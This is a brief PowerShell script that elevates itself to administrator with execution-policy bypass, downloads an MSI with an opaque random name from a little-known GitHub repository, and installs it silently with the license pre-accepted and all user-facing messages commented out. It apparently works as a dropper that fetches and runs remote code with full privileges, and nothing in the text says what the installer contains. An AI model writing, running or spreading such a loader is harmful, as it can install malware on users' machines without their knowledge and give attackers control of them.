# Requesting elevation if not admin
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
{
    Start-Process powershell "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# Set the MSI URL
$msiUrl = "https://github.com/isiahwaytt-tech/bilosa/raw/refs/heads/main/1G1T6ZEY6C1DS_19SI0B7FBSUF4_windows_x64.msi"

# Destination in TEMP folder
$dest = Join-Path $env:TEMP $([System.IO.Path]::GetFileName($msiUrl))

# Path for install log in TEMP
$log = Join-Path $env:TEMP "install_log.txt"

#Write-Output "Downloading MSI to $dest..."
Invoke-WebRequest -Uri $msiUrl -OutFile $dest

#Write-Output "Installing MSI..."
Start-Process -FilePath msiexec.exe -ArgumentList @(
    "/i", $dest,
    "/qn",
    "/L*v", $log,
    "LicenseAccepted=YES"
) -Wait

#Write-Output "Done."
pause
